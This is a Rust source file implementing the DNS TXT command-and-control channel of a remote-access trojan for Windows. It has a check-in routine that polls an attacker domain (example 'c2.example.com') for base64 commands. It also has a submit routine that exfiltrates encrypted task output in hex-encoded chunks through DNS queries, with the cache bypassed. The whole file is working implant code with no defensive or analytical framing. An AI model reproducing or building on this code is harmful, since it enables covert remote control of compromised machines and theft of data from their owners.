// channel.rs — DNS TXT C2 channel
//
// CHECK-IN  →  TXT query:   c.<rat_hex_label1>.<rat_hex_label2>....<domain>
//              TXT reply:   hex(task_id:base64_cmd)  |  empty / "NOTASK"
//
// SUBMIT    →  TXT queries: s.<seq_8hex>.<chunk_50hex>.<sess_8hex>.<domain>
//              End marker:  e.<total_4hex>.<sess_8hex>.<domain>
//              TXT reply per query: "ACK" | "DONE"
//
// Encoding: all binary data is lowercase hex.  DNS labels are capped at 60
// chars, well under the 63-byte RFC 1035 limit.  The full FQDN never exceeds
// 253 chars for any realistic rat_id or payload size.

use windows::{
    core::PCWSTR,
    Win32::NetworkManagement::Dns::{
        DnsRecordListFree, DnsQuery_W,
        DNS_QUERY_BYPASS_CACHE, DNS_RECORD, DNS_TYPE_TEXT,
    },
};

// Max chars per DNS label (RFC 1035 limit is 63; keep margin)
const LABEL_MAX: usize = 60;
// Max hex chars per submit chunk (gives a 25-byte payload slice per query)
const CHUNK_HEX: usize = 50;

// ── Helpers ──────────────────────────────────────────────────────────────────

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn to_hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{:02x}", x)).collect()
}

fn from_hex(s: &str) -> Option<Vec<u8>> {
    if s.len() % 2 != 0 {
        return None;
    }
    (0..s.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&s[i..i + 2], 16).ok())
        .collect()
}

/// Split a hex string into owned chunks of at most `n` characters.
fn hex_labels(hex: &str, n: usize) -> Vec<String> {
    hex.as_bytes()
        .chunks(n)
        .map(|c| String::from_utf8_lossy(c).into_owned())
        .collect()
}

/// Cheap per-call session tag derived from the nanosecond wall clock.
fn session_tag() -> String {
    let ns = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0);
    format!("{:08x}", ns)
}

// ── DNS query ────────────────────────────────────────────────────────────────

/// Issue a TXT DNS query for `fqdn` and return the concatenated string data,
/// or `None` on failure / no records.
unsafe fn dns_txt(fqdn: &str) -> Option<String> {
    let name_w = to_wide(fqdn);
    let mut records: *mut DNS_RECORD = std::ptr::null_mut();

    let status = DnsQuery_W(
        PCWSTR(name_w.as_ptr()),
        DNS_TYPE_TEXT,
        DNS_QUERY_BYPASS_CACHE,
        None,
        Some(&mut records),
        None,
    );

    if status.is_err() || records.is_null() {
        return None;
    }

    let mut buf = String::new();
    let mut node = records;

    while !node.is_null() {
        let rec = &*node;
        if rec.wType == DNS_TYPE_TEXT {
            let txt   = &rec.Data.TXT;
            let base  = txt.pStringArray.as_ptr();
            for i in 0..txt.dwStringCount as isize {
                let pwstr = *base.offset(i);
                if !pwstr.is_null() {
                    // PWSTR::to_string() walks the null-terminated wide string
                    if let Ok(s) = pwstr.to_string() {
                        buf.push_str(&s);
                    }
                }
            }
        }
        node = (*node).pNext;
    }

    // Free the record list (DNS_FREE_TYPE 1 = DnsFreeRecordList)
    DnsRecordListFree(records as _, windows::Win32::NetworkManagement::Dns::DNS_FREE_TYPE(1));

    if buf.is_empty() { None } else { Some(buf) }
}

// ── Public channel interface ──────────────────────────────────────────────────

/// Poll the C2 domain for an encrypted task.
///
/// `domain`  — bare DNS domain, e.g. `"c2.example.com"`
/// `rat_id`  — base64 implant identifier from beacon_loop
///
/// Returns the raw wire string `"task_id:base64_cmd"` on success.
pub fn get_task(domain: &str, rat_id: &str) -> Option<String> {
    // Hex-encode rat_id, split into ≤60-char labels, prefix with "c" type marker
    let rat_hex = to_hex(rat_id.as_bytes());
    let mut parts: Vec<String> = vec!["c".into()];
    parts.extend(hex_labels(&rat_hex, LABEL_MAX));
    parts.push(domain.into());
    let fqdn = parts.join(".");

    let resp = unsafe { dns_txt(&fqdn) }?;
    let resp = resp.trim();

    if resp.is_empty() || resp == "NOTASK" {
        return None;
    }

    // Hex-decode the response to recover the task wire string
    let bytes = from_hex(resp)?;
    String::from_utf8(bytes).ok()
}

/// Send encrypted task output back to the C2 domain via chunked TXT queries.
///
/// `domain`  — bare DNS domain, e.g. `"c2.example.com"`
/// `payload` — AES-encrypted, base64-encoded output string
pub fn task_io(domain: &str, payload: &str) {
    let sess        = session_tag();
    let payload_hex = to_hex(payload.as_bytes());
    let chunks      = hex_labels(&payload_hex, CHUNK_HEX);
    let total       = chunks.len();

    // Send each chunk: s.<seq_8hex>.<chunk_hex>.<sess>.<domain>
    for (seq, chunk) in chunks.iter().enumerate() {
        let fqdn = format!("s.{:08x}.{}.{}.{}", seq, chunk, sess, domain);
        // Two attempts per chunk; move on regardless to avoid stalling
        for _ in 0..2 {
            if unsafe { dns_txt(&fqdn) }.as_deref() == Some("ACK") {
                break;
            }
        }
    }

    // End marker: e.<total_4hex>.<sess>.<domain>
    let end_fqdn = format!("e.{:04x}.{}.{}", total, sess, domain);
    for _ in 0..2 {
        if unsafe { dns_txt(&end_fqdn) }.as_deref() == Some("DONE") {
            break;
        }
    }
}
